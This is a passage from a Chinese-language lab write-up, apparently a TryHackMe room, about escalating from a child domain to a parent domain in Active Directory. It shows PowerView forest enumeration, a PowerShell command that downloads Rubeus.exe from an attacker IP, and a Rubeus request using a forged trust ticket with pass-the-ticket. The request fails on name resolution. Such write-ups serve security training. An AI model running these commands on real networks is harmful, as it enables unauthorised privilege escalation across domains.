PS C:\users\bitbucket\Desktop> Get-NetForest


RootDomainSid         : S-1-5-21-1835041512-953509921-1126143443
Name                  : ENTERPRISE.THM
Sites                 : {Default-First-Site-Name}
Domains               : {ENTERPRISE.THM, LAB.ENTERPRISE.THM}
GlobalCatalogs        : {ENTERPRISE-DC.ENTERPRISE.THM, LAB-DC.LAB.ENTERPRISE.THM}
ApplicationPartitions : {DC=ForestDnsZones,DC=ENTERPRISE,DC=THM, DC=DomainDnsZones,DC=ENTERPRISE,DC=THM, DC=DomainDnsZones,DC=LAB,DC=ENTERPRISE,DC=THM}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : ENTERPRISE.THM
Schema                : CN=Schema,CN=Configuration,DC=ENTERPRISE,DC=THM
SchemaRoleOwner       : ENTERPRISE-DC.ENTERPRISE.THM
NamingRoleOwner       : ENTERPRISE-DC.ENTERPRISE.THM
```

可以看到父域的DC服务器是：ENTERPRISE-DC.ENTERPRISE.THM

传Rubeus.exe到本地
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.63.196/Rubeus.exe','C:\users\bitbucket\Desktop\Rubeus.exe')"
```

使用Rubeus尝试生成一个tgs
```
PS C:\users\bitbucket\Desktop> .\Rubeus.exe asktgs /ticket:C:\users\bitbucket\Desktop\trust_tkt.kirbi /service:cifs/ENTERPRISE-DC.ENTERPRISE.THM /dc:ENTERPRISE-DC.ENTERPRISE.THM /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGS

[X] Error resolving hostname 'ENTERPRISE-DC.ENTERPRISE.THM' to an IP address: No such host is known
```

但是报错了，说找不到这个主机名

用powerview查找也没找到
```
PS C:\users\bitbucket\Desktop> Get-NetComputer -Domain LAB.ENTERPRISE.THM
LAB-DC.LAB.ENTERPRISE.THM
PS C:\users\bitbucket\Desktop> Get-NetComputer -Domain ENTERPRISE.THM
WARNING: Error: Exception calling "FindAll" with "0" argument(s): "A referral was returned from the server."
```

这个就很奇怪。。